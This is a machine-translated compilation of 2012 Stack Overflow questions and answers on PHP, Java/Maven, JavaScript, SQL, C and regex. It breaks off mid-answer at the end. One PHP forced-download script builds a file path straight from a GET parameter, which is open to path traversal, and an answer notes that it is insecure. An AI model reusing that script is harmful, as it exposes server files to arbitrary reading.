您的文件中应该有一个`mail.log`条目，该条目`php.ini`应该记录所有`mail()`函数调用。搜索它，如果你没有这一行，那么它采用了一些奇怪的默认值或以前定义的值，所以你最好定义它并将它指向你在 PHP 文件夹中创建的文件，并希望分配好的权限。有关更多信息，请查看`phpinfo()`有关 mail.log 的内容。

更多信息：[邮件配置](http://www.php.net/manual/en/mail.configuration.php#ini.mail.log)。

# javascript - 在 href 上获取请求状态

> ID：12461166
> 
> 赞同：1
> 
> 时间：2012-09-17T14:14:19.707
> 
> 标签：javascript, href

我正在使用 href 链接从服务器下载文件。从服务器完全下载文件后，我想做一些活动。像 XMLHTTP 一样，我可以在 href 上设置一些回调函数，该函数将在请求完成时调用。

我的代码是这样的

```
///link to download report
<div class='report-download'><a href='' id='downloadreq'></a></div>
$("#report-download").click(OnClick);

 ///onlick function
functon OnClick()
{
  ///start progress bar
  $("#downloadreq").attr("href","8001.html?data=dowloadreport");
  //stop progress bar

} 
```

我想在下载发生时显示一个进度条，并且我有代码来启动和停止进度条窗口。但是当我插入代码来停止进度条时，它在实际下载完成之前执行并且进度条消失了。我将如何识别报告下载已完成（或）是否可以识别下载已完成。下载报告所需的时间将很大程度上取决于要下载的记录数量。所以我不能等待默认时间段并停止进度条。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T09:26:22.877

我认为没有办法`event`知道文件下载是否已经完成。如果我是你，我会做这样的事情：

1.  通过 PHP 打开文件并通过 HTTP 将其发送到客户端的浏览器
2.  我会有一个变量，`$_SESSION['lock'] = true;`并且会在开始将流发送到输出之前设置它
3.  文件下载完成后，我将通过以下方式解锁变量`$_SESSION['lock'] = false;`
4.  在文件下载期间，我可以检查该`lock`值以查看文件是否已完成。通过 AJAX 每 2-5 秒说一次。
5.  完成后 - `lock`is `false`，我可以做任何需要的事情，但我不知道如何显示进度条，即使是近似的。

请注意，如果您不使用 a 之类的东西`$_SESSION`，则锁定机制根本不起作用，因为脚本每次都会作为新脚本运行，而对最近的变量等一无所知。

**更新：**

就理解源代码而言，您可能希望使用它`$_SESSION['finished']`而不是`$_SESSION['lock']`更有意义。

# java - 按工件版本向后兼容

> ID：12461171
> 
> 赞同：1
> 
> 时间：2012-09-17T14:14:32.107
> 
> 标签：java, xml, maven

我正在开发一个带有三个 Maven 项目的 RESTful webapp。这是我的 Maven 设置（从一些细节中删除）

客户端（第二版）：

```
<project>
    <groupId>com.mycompany.app</groupId>
    <artifactId>app-client</artifactId>
    <version>2.0</version>
    ...
    <dependency>
        <groupId>com.mycompany.app</groupId>
        <artifactId>app-model</artifactId>
        <version>2.0</version>
    </dependency>
</project> 
```

型号（第二版）：

```
<project>
    <groupId>com.mycompany.app</groupId>
    <artifactId>app-model</artifactId>
    <version>2.0</version>
</project>
...
<plugin>
    <groupId>org.jvnet.jaxb2.maven2</groupId>
    <artifactId>maven-jaxb2-plugin</artifactId>
    <configuration>
        <generatePackage>com.mycompany.app.model.v2</generatePackage>
    </configuration>
</plugin> 
```

Webapp（第二版）：

```
<project>
    <groupId>com.mycompany.app</groupId>
    <artifactId>app-webapp</artifactId>
    <version>2.0</version>
    ...
    <dependency>
        <groupId>com.mycompany.app</groupId>
        <artifactId>app-model</artifactId>
        <version>1.0</version>
    </dependency>
    <dependency>
        <groupId>com.mycompany.app</groupId>
        <artifactId>app-model</artifactId>
        <version>2.0</version>
    </dependency>
</project> 
```

对于每个版本，我都会更新模型的包名称以确保唯一的类名。

com.mycompany.app:app-model:1.0 中的类 Foo

```
package com.mycompany.app.model.v1;

public class Foo {
    private String name;
} 
```

com.mycompany.app:app-model:2.0 中的类 Foo

```
package com.mycompany.app.model.v2;

public class Foo {
    private String name;
    private int age;
} 
```

在第一个版本中，一切正常，因为 webapp 只依赖于 com.mycompany.app:app-model:1.0。在第二个版本中，maven 决定只依赖 com.mycompany.app:app-model:2.0。这是正常行为，我理解为什么在正常情况下这是一件好事。尽管如此。我的 Backwords 兼容性代码（在服务器中）想要使用 com.mycompany.app:app-model:1.0 中的类，因为在该版本中发布的客户端使用这些类。新客户端（2.0 版）的代码希望使用 com.mycompany.app:app-model:2.0 类。

我敢肯定有一种方法可以欺骗 maven 来依赖两者，但是如何呢？通常当我最终陷入这种情况时，我的脑海中就会出现警报，而且我解决问题的方式通常有问题。但我似乎无法在这里找到另一种方法，它不包括其他“更大”的缺点:( 有人想吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T01:19:42.777

所以，为了回答我自己的问题，这就是我想出的。我认为这是非常严格的，而且没有太多开箱即用。

最初我有 3 件文物：

*   com.mycompany.app:app-client
*   com.mycompany.app:app-model
*   com.mycompany.app:app-webapp

最后我又介绍了一件文物：

*   com.mycompany.app:app 依赖

此工件唯一的工作是将所有已发布的模型工件捆绑到一个可靠的工件中。为此，我遵循了 Esko 的建议并使用了 maven 插件：

*   org.apache.maven.plugins:maven 依赖插件

目标是*unpack*。这会将所有 .class 文件放在目标下的一个目录中，并且由于我确保每个模型版本都在一个独特的包中生成类，因此它运行良好，没有任何覆盖。我只包含了 .class 文件并省略了所有其他文件（MANIFEST.MF、pom.xml 和 pom.properties）

在那之后，三重奏很简单。我所要做的就是向工件添加一个资源，因为它不包含任何其他来源，它成为一个新的可靠工件。好的！

现在，为了让这一切按我想要的方式工作，我将新工件声明为我的 webapp 工件中的依赖项，让我可以访问模型的所有版本中的所有类。另一方面，客户端仍然只需要依赖模型，因为客户端只对最新的模型版本（发布时间）感兴趣。

我还设法设计了 webapp，以便如果第 1 版的客户端调用 webapp，他会在模型版本 1 中得到响应，这是他理解的。同时，当来自版本 2 的客户端调用 webbap 时，他会在模型版本 2 中得到响应，这是他理解的。这是一直以来的目标，我认为这将促进我的 api 版本控制。

我应该提到，webapp 有它自己的域模型（独立但类似于表示模型），因此所有请求都完成了从域到表示的转换。对于第 1 版，这两个模型几乎相同，但在第 2 版中，域发生了变化，（最新的）演示文稿也发生了变化。webapp 最好将域转换为表示模型 1 和 2，但模型 1 可能没有所有信息。现在，如果域模型变化如此之大以至于尝试将其转换为表示模型 1 没有任何意义，我认为是时候停止支持该模型了……

依赖 maven pom 最终看起来像这样（对于第 2 版）

```
<project>

  <groupId>com.mycompany.app</groupId>
  <artifactId>app-depend</artifactId>
  <version>2.0</version>
  <packaging>jar</packaging>

  <build>
    <resources>
      <resource>
        <!-- this is where 'unpack' puts the files -->
        <directory>${project.build.directory}/dependency</directory>
        <filtering>false</filtering>
      </resource>
    </resources>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-dependency-plugin</artifactId>
        <version>2.5.1</version>
        <executions>
          <execution>
            <id>unpack</id>
            <!-- we must do the 'unpack' before the building the jar -->
            <phase>generate-sources</phase>
            <goals>
              <goal>unpack</goal>
            </goals>
            <configuration>
              <artifactItems>
                <artifactItem>
                  <groupId>com.mycompany.app</groupId>
                  <artifactId>app-model</artifactId>
                  <version>1.0</version>
                  <type>jar</type>
                  <includes>com/mycompany/app/model/v1/**</includes>
                </artifactItem>
                <artifactItem>
                  <groupId>com.mycompany.app</groupId>
                  <artifactId>app-model</artifactId>
                  <version>2.0</version>
                  <type>jar</type>
                  <includes>com/mycompany/app/model/v2/**</includes>
                </artifactItem>
                <!-- future releases will go here -->
              </artifactItems>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>

</project> 
```

这就是IT人！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T07:54:49.317

您可以使用[Maven 依赖插件的复制目标](http://maven.apache.org/plugins/maven-dependency-plugin/copy-mojo.html)将这些工件复制到项目中的目录中。复制同一工件的多个版本应该没问题。尽管它还不能帮助针对这些不同版本编译代码（您可能需要将附加的类路径配置为手写[编译器参数](http://maven.apache.org/plugins/maven-compiler-plugin/compile-mojo.html)）。

或者然后只需更改每个版本的工件 ID。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:41:48.283

这个问题比 Maven 更深。默认情况下，JVM 只会加载一个类的一个版本。如果`com.mycompany.app.model.ModelObject`（例如）的两个版本在您的程序的类路径中，当您的一个类请求`ModelObject`时，类加载器将出去并加载它找到的第一个。

我看到在公共 Web 服务中处理此问题的一种方法是根据所有类的版本为其命名。因此，例如，版本 1 模型类可以放在包中`com.mycompany.app.model_1`，而版本 2 模型类可以放在`com.mycompany.app.model_2`. 不过，在这种情况下，您（和客户）最终可能会编写相当多的额外代码。

可能更简单的方法是为您要支持的模型的每个版本托管一个单独的 webapp，webapp 路径基于模型版本。因此，在这种情况下，版本 1 webapp 可能托管在`http://app.mycompany.com/webapp_1/...`，版本 2 可能托管在`http://app.mycompany.com/webapp_2/...`. （Web 服务器为每个 webapp 使用单独的类加载器，因此 webapp_1 和 webapp_2 可以使用同一类的不同版本。）

（如果您喜欢冒险，您还可以尝试在单个 web 应用程序中为每个模型版本设置自己的单独的类加载器。不过我不知道我是否会推荐。）

# javascript - 实时监控node.js服务器

> ID：12461181
> 
> 赞同：3
> 
> 时间：2012-09-17T14:14:54.793
> 
> 标签：javascript, node.js, highcharts, real-time, monitoring

基本上，我需要一个可以为节点服务器计算的收集数据绘制实时图表的工具。

我尝试安装[Graphite](http://erikimh.com/graphite/)，但安装失败（linux 中的新手导致太多依赖项安装失败）。所以我正在寻找是否有其他工具可以通过简单的安装指南完成类似的工作？

我也看了 abit [highcharts](http://www.highcharts.com/)，但几乎没有任何关于 node.js 的文档。如果有人体验过这些工具并提供一些建议，将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T17:48:36.030

如果不知道您正在计算什么样的分析数据以及您正在使用什么类型的图表，那么给您一个很好的例子有点困难。但无论如何，这是一个简单的场景。

当服务器更改一些分析数据时，使用 socket.io 向客户端发送一条消息，其中包含新的分析数据。像这样的东西：

```
io.sockets.emit('analyticsUpdate', x, y); 
```

在客户端，正常创建 Highcharts 图表，然后将 load() 事件添加到图表选项，并使用 socket.io 检索新数据并更新图表，如下所示：

```
 var chart;
    chart = new Highcharts.Chart({
        chart: {
            renderTo: 'container',
            type: 'spline',
            events: {
                load: function() {
                    socket.on('analyticsUpdate', function (x, y) {
                         // Simple case where you have a single series
                         // and your data can simply be appended to the series

                         var series = this.series[0];
                         series.addPoint([x, y], true, true);
                    };
                }
            }
        }
    }); 
```

因此，每当服务器更新一些分析数据时，socket.io 就会发出一条消息。客户端总是在监听来自服务器的消息，因此每当它收到一条新消息时，它都会更新图表。

# android - 用于平板电脑的 andengine 中的相机尺寸

> ID：12461182
> 
> 赞同：0
> 
> 时间：2012-09-17T14:14:56.563
> 
> 标签：android, andengine

我正在使用andengine专门为Android平板电脑编写游戏。如果我使用固定摄像头，引擎将缩放视图以填充设备屏幕。我必须为 CAMERA_WIDTH 和 CAMERA_HEIGHT 使用什么值，这样游戏才能在大多数流行的平板电脑上正常运行？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:37:20.487

我认为您应该考虑为特定尺寸编写 - 比如 7 英寸平板电脑 - Nexus 7 的分辨率为 1280 x 800。然后让 AndEngine 使用 RatioResolutionPolicy 来调整任何其他屏幕尺寸的差异。有关更多信息，请参阅此答案信息

[不同屏幕尺寸Andengine Android上的精灵尺寸](https://stackoverflow.com/questions/11399045/sprite-size-on-different-screen-size-andengine-android/11412294#11412294)

# html - 在不使用 JavaScript / jQuery 的情况下单击标题并展开文本

> ID：12461183
> 
> 赞同：6
> 
> 时间：2012-09-17T14:14:58.100
> 
> 标签：html, css, text, expand, collapse

正如标题中所指出的，我的问题很简单：有没有什么方法可以在不使用 JavaScript 或 jQuery 的情况下实现单击标题（标题）并展开（和折叠）与之关联的文本？是否有任何与浏览器兼容的方法（IE 6+ 证明）？

我为一个会议制作了一个非常简单的 HTML+CSS 站点，并且我只想在必要时使用 JS。所以，我只是问我是否可以只坚持 HMTL/CSS，当然，以兼容的方式。

我发现的少数解决方案是旧的或与某些浏览器版本不兼容。

非常感谢，若昂

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T14:29:01.333

**IE6** -proof 纯 CSS 解决方案？

# 不

[把死者留在坟墓里，不要试图让他们跑马拉松。当你要求 IE6 做这样的事情时，这就是你正在做的事情。]

* * *

**IE7/8？**

是的，有一个解决方案（原理与[我的这个旧演示中](http://jsfiddle.net/thebabydino/U7Cyk/)使用的原理相同），但它不是持久的（这意味着如果您单击页面上的其他任何地方，您的展开内容将崩溃）并且它的行为有点在 IE7 中很奇怪（这意味着您必须在单击后将鼠标悬停在单击的元素上才能看到您的内容扩展）。

* * *

**IE9+ 和其他浏览器**？

**是的！**也执着。[**与我在这里**](http://dabblet.com/gist/3157489)使用的原理相同。

* * *

**JavaScript/jQuery 方法？**

**是的！**请参阅：[同一演示的 jQuery 版本](http://jsfiddle.net/thebabydino/yDfTq/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T14:28:18.897

您可以使用支持跨浏览器的 HTML 和 CSS 来制作简单的 Hover 下拉菜单：

[http://jsfiddle.net/fkS2z/](http://jsfiddle.net/fkS2z/)

您可以使用较低版本的 IE 不支持的 CSS 过渡使用淡入淡出或向下滑动来改进这一点：

[http://jsfiddle.net/N9fDy/1/](http://jsfiddle.net/N9fDy/1/)

不是那么点击虽然。

# java - 通过服务器上的网络摄像头进行小程序直播

> ID：12461188
> 
> 赞同：0
> 
> 时间：2012-09-17T14:15:38.987
> 
> 标签：java, applet, streaming, webcam, live

我想在小程序中嵌入一个直播面板。

搜索后我发现：

*   JMF .. 但发现它非常旧（2002 年）并且需要 JDK 和 JRE 的 32 位版本，因为小程序包含以前编写的另一个组件，所以不可用。
*   Xuggler .. 但我发现它缺乏对从网络摄像头捕获实时流的良好支持。

那么，是否有另一个图书馆或项目可以实现我的目标？

提前致谢， Ali Zein

# mysql - 使用多对多表 MySQL 过滤

> ID：12461194
> 
> 赞同：3
> 
> 时间：2012-09-17T14:15:50.167
> 
> 标签：mysql, sql, filter

我有以下表格（为简单起见，省略了其他表格）。1 适用于所有人，2 适用于这些人所从事的运动。我正在使用 php 来允许用户查看人员列表。他们可以按人名或他们参加的运动进行过滤。所以，我希望能够看到所有打棒球和足球的人。

```
create table people (
  id int,
  name varchar(50)
  );

create table people_to_sports (
  personID int,
  sportID int,
  primary key(personID,sportID)
  ); 
```

基本上我的问题是，我如何使用 people_to_sports 来获取所有参加运动 1 和运动 2 的人的列表？

我[这里](http://sqlfiddle.com/#!2/0a149/10)有一个 sqlfiddle 。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:17:56.753

```
SELECT
  personID
FROM
  people_to_sports
WHERE
  sportID IN (1, 2)
GROUP BY
  personID
HAVING
  COUNT(*) = 2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:18:13.060

```
SELECT personID, COUNT(personID) AS cnt
FROM people_to_sports
WHERE sportID IN (1, 2)
GROUP BY personID
HAVING cnt = 2 
```

# sublimetext2 - 使用 sublime text 2 在新窗口中运行程序

> ID：12461209
> 
> 赞同：2
> 
> 时间：2012-09-17T14:16:27.873
> 
> 标签：sublimetext2

我正在使用 Sublime Text 2 进行编程，我想知道是否有办法在新窗口中运行程序。有一段时间我使用 Geany 作为我的 python 编辑器，当我运行一个程序时，程序会在一个名为 geany_run_script.sh 的窗口中启动。有没有办法实现我想要的？谢谢。

（如果有帮助，我正在运行 Linux 并使用 Python 编程）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-04T05:23:36.923

如果通过窗口你的意思是一个新的选项卡/缓冲区，那么这个： [https](https://github.com/vhyza/exec-in-window) ://github.com/vhyza/exec-in-window 正是你想要的。您可以通过 Package Control 获得它。

# java - 从 SQL 查询中检索时保留在列表中的订单

> ID：12461211
> 
> 赞同：1
> 
> 时间：2012-09-17T14:16:34.607
> 
> 标签：java, oracle, collections

我从会话中获取了一个列表（初始列表），其中包含以下顺序的客户 ID：-

```
[208700013, 30216118005, 30616118005, 10121005444, 206700013] 
```

现在，我使用“IN”查询将这些 customerIds 作为一个集合传递给客户表，为此我将获取字符串中的 customerIds 列表以及其他值。

但是按以下顺序检索 customerIds：

```
10121005444
206700013
208700013
30216118005
30616118005 
```

当我在视图中显示值时，这会产生问题。

如何获得与查询返回的列表顺序相同的顺序，该顺序在初始列表中设置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:19:59.963

如果您只有一手结果集，那么使用比较器在 java 中对它们进行排序可能是最简单的。

如果您必须在 oracle 中执行此操作，您可以使用如下语句：

```
select *  // never do that in production
from someTable
where id in (10121005444, 206700013, 208700013, 30216118005, 30616118005)
order by decode(id, 10121005444, 1, 206700013, 2, 208700013, 3, 30216118005, 4, 30616118005, 5) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:19:27.297

您不能使用该`IN`子句指定顺序。我认为你有两个选择：

1.  使用 执行查询`IN`，并在收到时对结果集进行排序
2.  按顺序对每个指定的 id 发出单独的查询。这显然效率较低，但实现起来很简单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:48:31.930

你可以使用这个查询——

```
SELECT id FROM table
WHERE id in (10121005444, 206700013, 208700013, 30216118005, 30616118005) 
ORDER BY FIND_IN_SET(id,
    "10121005444, 206700013, 208700013, 30216118005, 30616118005"); 
```

第二个列表定义您希望结果集的顺序

# winapi - 无法在动态链接库 KERNEL32.dll 中找到过程入口点 QueryFullProcessImageNameA

> ID：12461215
> 
> 赞同：0
> 
> 时间：2012-09-17T14:16:48.987
> 
> 标签：winapi, visual-studio-2008, windows-xp

我正在尝试在 XP 计算机上的 Visual Studio 上运行程序，但标题中出现错误。我有 XP 和 VS 的所有服务包。以前从未见过这样的事情，所以我真的不知道。有人以前见过这个问题或知道可能出了什么问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:20:16.663

此 API 自 Vista 以来可用，另请参阅 MSDN 章节要求：

[http://msdn.microsoft.com/en-us/library/windows/desktop/ms684919(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684919(v=vs.85).aspx)

到目前为止，该 API 根本不可用。尝试搜索与 XP 相同的东西。

# jsf - 为什么经过身份验证后会出现 Unexpected viewExpiredException？

> ID：12461218
> 
> 赞同：1
> 
> 时间：2012-09-17T14:16:57.397
> 
> 标签：jsf, richfaces, websphere-7, webseal, ltpa

我正在开发一个使用 WAS 7.0 和 Richfaces 3.3.3 的应用程序。

当我在没有身份验证的情况下工作时，超时后我只有预期的 ViewExpiredException。

现在我要通过带有 LTPA cookie 的 Webseal 访问同一台机器，我在第一次或第二次 Ajax 调用期间收到 ViewExpiredException，使我的应用程序无用。

有人知道为什么我突然得到那些 ViewExpiredException 的“所有时间”吗？

提前致谢。

# jquery - 我怎样才能更快地获得具有某些类的元素的 .index() ？

> ID：12461219
> 
> 赞同：1
> 
> 时间：2012-09-17T14:17:04.503
> 
> 标签：jquery, html, css

假设我有这些元素：

```
​&lt;div class="myClass" id="class_3">&nbsp;</div>
<div class="myClass" id="class_1">&nbsp;</div>
<div class="NOTTHIS">&nbsp;</div>
<div class="myClass" id="class_0">&nbsp;</div>
<div class="myClass" id="class_2">&nbsp;</div> 
```

如何使用 jQuery 获得更快的元素索引，`class_0`仅评估具有类的元素`myClass`

在示例中应该是 2，而不是 3！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T14:18:21.417

使用[`index()`](http://api.jquery.com/index/)方法，就这么简单：

```
$("#class_0").index(".myClass"); 
```

# c - c中的自由函数

> ID：12461220
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:17:05.620
> 
> 标签：c

我已经为某些数据类型分配了内存并分配了一些值。现在使用`free`内存中的数据是否被删除？`free`如果分配的数据没有被删除，使用有什么用？谁能帮我吗？前任：

```
int *arr;
arr=(int*)malloc(sizeof(int)*1000);
assert(arr!=NULL);
/*Some operation*/

arr[123]=354;
//some operations

printf("%d",*(arr+123));
//calling some funcs

free(arr);

printf("\n%d",*(arr+123)); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:18:25.993

的要点`free`是使您分配的内存可用于以下对`malloc`. 它不保证传递给它的缓冲区以任何方式被擦除。

事实上，你正在做的是引发**未定义的行为**；访问已经`free`'d 的缓冲区可能会给出之前存储在其中的值或任何其他值，或者它可能会使您的程序崩溃或执行其他任何操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:19:17.773

你不能从内存中“删除”东西。

`free()`它的作用是回收*内存* ，以便将来调用`malloc()`.

在调用它之后，您不能合法地取消引用您从`malloc()`（或任何其他动态分配调用）获得的指针`free()`。这样做会调用未定义的行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:32:40.813

通过使用 malloc，您可以留出指定数量的字节用于您想要的任何内容。返回的是该区域的地址。内存区域也在一个特殊的表中被标记为被占用，这意味着它不能被另一个进程或另一个 malloc 保留。

当您释放分配的内存时，该区域被标记为空闲，但数据不会被擦除。如果要擦除数据，则必须先执行 memset 或手动循环并将数据设置为 0 或其他值**，然后再释放它**。

正如其他人所提到的，对空闲内存的操作是未定义的。

*简要*介绍如何安排内存。看看堆： [http](http://www.geeksforgeeks.org/archives/14268) ://www.geeksforgeeks.org/archives/14268或图 1。在此评论的底部：[奇怪的全局变量行为，一旦变量名被更改，问题就会消失](https://stackoverflow.com/questions/9839969/strange-global-variable-behaviour-once-variable-name-is-changed-issue-disappear/9859393#9859393)

我在这里写了更多关于 malloc 进程本身的内容： [Can some explain the performance behavior of the following memory allocating C program?](https://stackoverflow.com/questions/10096294/can-some-explain-the-performance-behavior-of-the-following-memory-allocating-c-p/10214527#10214527) 其中虚拟内存与物理内存、页面等也是其中的一些要点。

# javascript - 是否有测试来确定页面是否要求位置授权？

> ID：12461222
> 
> 赞同：3
> 
> 时间：2012-09-17T14:17:07.003
> 
> 标签：javascript, location

如果用户的浏览器请求允许我们确定用户的位置，我想在页面上显示信息，但是如果浏览器已经过身份验证以向我们提供他们的位置，我不想尝试显示此信息。

有没有这样做的好方法？

详细地。我想显示一条消息，说“请点击‘允许这些人获取你的位置’的框”，因为在用户测试中，我们发现用户看不到对话并感到困惑。

但是，即使我们在他们通过位置查找页面时获得了他们的许可，这也会导致我们闪烁帮助消息。存储他们给予我们许可的事实并没有帮助，因为他们可能会撤销该许可，而我们不会知道。

有任何想法吗？

干杯马克。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:19:44.907

您可以提交错误回调来`getCurrentPosition()`确定用户是否拒绝跟踪/无法确定位置（[规范](http://dev.w3.org/geo/api/spec-source.html#position_error_interface)）。

此外，我会设置一个 TimeOut，它会在一定时间后提示您的消息，因为在这种情况下，用户很可能忽略了浏览器对话框。

示例代码：

```
function getLocation(){
  if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition,showError);
     // set a Timeout, after which the user gets prompted
     // ugly global var but you could prevent this e.g. with a closure
     t = window.setTimeout(
              function(){alert("Please allow us to locate you;) !")},3000
         );
  } else {
     alert("Geolocation is not supported by this browser.");
  }
}
function showPosition(position){
      alert("Latitude: " + position.coords.latitude + " - Longitude: " + position.coords.longitude);
      // position could be determined, clear the timeout
      window.clearTimeout(t);   
}
function showError(error){
  // an error occured, clear the timeout as well
  window.clearTimeout(t);
  switch(error.code) {
    case error.PERMISSION_DENIED:
      alert("User denied the request.");
      // Do stuff here, etc. ask the user to please allow the request
      break;
    case error.POSITION_UNAVAILABLE:
      alert("No Location information available.");
      break;
    case error.TIMEOUT:
      // user probably didn't recognize the browser dialog
      alert("The request timed out.");
      break;
    case error.UNKNOWN_ERROR:
      alert("An unknown error occurred.");
      break;
    }
} 
```

但是，您仍然可以存储权限并进行检查。如果他们撤销他们的许可，您将遇到错误回调，您可以在其中采取相应的措施。

# php - php 使用 header() 强制下载损坏的下载文件

> ID：12461224
> 
> 赞同：1
> 
> 时间：2012-09-17T14:17:08.933
> 
> 标签：php, header, download, buffer, liferay

所以首先我想告诉我，我在使用标头和使用输出缓冲区方面是个新手。所以我正在为 liferay 开发 php portlet，我在文件下载方面遇到了一些问题。我试图简单地使用'a href'来做到这一点，但问题是通过php上传的文件在刷新apache之前不可用，所以我尝试了另一种使用header（）函数的方法。

所以我会试着解释我的问题。当我在简单的 php 项目上尝试以下代码时，它工作正常：

```
 <?php

$path = "/mysecretdir/upload/"; // change the path to fit your websites document structure
$fullPath = $path.$_GET['download_file'];

if ($fd = fopen ($fullPath, "r")) {

    $fsize = filesize($fullPath);

    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);

    switch($ext) {

        case "pdf":
            $ctype = "application/pdf";
            break;
        case "exe":
            $ctype = "application/octet-stream";
            break;
        case "zip":
            $ctype = "application/zip";
            break;
        case "doc":
            $ctype = "application/msword";
            break;
        case "xls":
            $ctype = "application/vnd.ms-excel";
            break;
        case "ppt":
            $ctype = "application/vnd.ms-powerpoint";
            break;
        case "gif":
            $ctype = "image/gif";
            break;
        case "png":
            $ctype = "image/png";
            break;
        case "jpeg":
            $ctype = "image/jpg";
            break;
        case "jpg":
            $ctype = "image/jpg";
            break;
        case "mp3":
            $ctype = "audio/mp3";
            break;
        case "wav":
            $ctype = "audio/x-wav";
            break;
        case "wma":
            $ctype = "audio/x-wav";
            break;
        case "mpeg":
            $ctype = "video/mpeg";
            break;
        case "mpg":
            $ctype = "video/mpeg";
            break;
        case "mpe":
            $ctype = "video/mpeg";
            break;
        case "mov":
            $ctype = "video/quicktime";
            break;
        case "avi":
            $ctype = "video/x-msvideo";
            break;
        case "src":
            $ctype = "plain/text";
            break;
        default:
            $ctype = "application/force-download";
    }

    header("Pragma: public");

    header("Expires: 0");

    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

    header("Cache-Control: private",false);

    header("Content-type: " . $ctype);

    header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\"");

    header("Content-Transfer-Encoding: binary");

    //header("Content-length: $fsize");
    header("Cache-control: public"); //use this to open files directly    

    while(!feof($fd)) {
        echo fread($fd, 4096); 
    flush();
    }
}
fclose ($fd);
?> 
```

从 index.php 我用 href="download.php?download_file=/something/" 调用它

好的，但现在重点。当我在liferay portlet 中使用它时，文件很奇怪。它将整个生成的 HTML 文件放入创建的文件中。所以它坏了。我不知道为什么。我不知道标头是否从其他地方发送了一些信息，也不知道如何修复它。

我花了几个小时寻找一些解决方案，但不知道如何以某种方式为标题创建“会话”，因为我认为它们有问题。因为没有回声，它只打印文件和其他项目的内容 - 更简单的 php 应用程序不是它的门户的一部分！但也许我错了。

那么请有人可以帮助我吗？有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:33:05.420

我无法帮助您解决特定的 php-portlet 问题（我从未将 Liferay 与 php 一起使用），但听起来您获得了“围绕”您下载的文件生成的整个页面 HTML。这就是您在仅呈现 portlet 时得到的结果：portlet 始终嵌入在 HTML 页面中，因此您不能在 HTTP 级别上提供特定的标头以及 portlet 的标准呈现输出。

您需要`serveResource`的是 portlet 的生命周期阶段。这将允许您提供不属于页面的内容，但您可以完全控制下载和 HTTP 标头。如何使用 php portlets 做到这一点，我将不得不留给你。

**编辑**（附加信息）：正如您在评论中所问的那样，我发现了一篇较旧的（可能需要修改）[Wiki 文章](https://www.liferay.com/community/wiki/-/wiki/Main/Working+with+Complex+PHP+Portlets+%28and+Ajax%29)，其中讨论了使用 state=exclusive 来执行相同的技巧 - 而不是我上面建议的 serveResource。我不知道这是由于文章年代久远还是因为 PHP portlet 不支持该生命周期，但您可能会在相关文章和链接文章中找到一些内容。注意：如果我没记错的话，serveResource 会生成一个 p_p_lifecycle=2 参数，而本示例使用 p_p_lifecycle=0（渲染）和 p_p_state=exclusive。试试这是否符合您的要求

但是，请考虑 Marc B 关于您的代码不安全且过于硬编码的评论。对于根本问题有更好的解决方案——例如，Liferay 提供了文档库来开箱即用地上传/下载文件。而且不存在这些问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:22:10.017

如果您以空格或任何其他字符开始您的 PHP 文件，标题将不起作用并且显示/下载将失败。`<?php`确保标签之前没有任何内容。

除此之外，这应该可以工作（如果您在浏览器中没有收到错误）。

另一方面，如果您看到实际的 PHP 代码，您的服务器不支持 PHP。

# regex - 正则表达式帮助：一个字符，后跟至少一位数字

> ID：12461226
> 
> 赞同：0
> 
> 时间：2012-09-17T14:17:12.653
> 
> 标签：regex

我需要一个正则表达式，它将显示一个字符串以一个字符（az）开头，并且后跟至少一个数字。

我努力了...

> `^[a-zA-Z]{1}\d+`

我的测试数据是...

```
a1234 (pass)
B123444434 (pass)
Z098745 (pass)
ZZ12345 (fail)
G4b553b3 (fail) 
```

问题是最后两行应该失败但不要，我不确定问题是我的正则表达式还是我的 c#（下）；

```
 int pass = 0;
    int fail = 0;

    string[] testdata = 
    {
        "a1234", 
        "B1234", 
        "Z098745", 
        "ZZ12345", 
        "G4b5533", 
    };

    string sPattern = "[a-zA-Z]{1}\\d+";

    foreach (string s in testdata)
    {
        if (System.Text.RegularExpressions.Regex.IsMatch(s, sPattern))
        {
            pass++;
        }
        else
        {
            fail++;
        }
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:47:31.477

您似乎错过`^`了您的代码，因此`Z12345`匹配 for`ZZ12345`和`b5533`匹配`G4b5533`.

正如它所提到的，`{1}`是多余的。

我相信你应该有

```
string sPattern = "^[a-zA-Z]\\d+$"; 
```

在你的代码中。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-18T08:22:00.890

经过重新思考（并睡个好觉），我想出了这个......

```
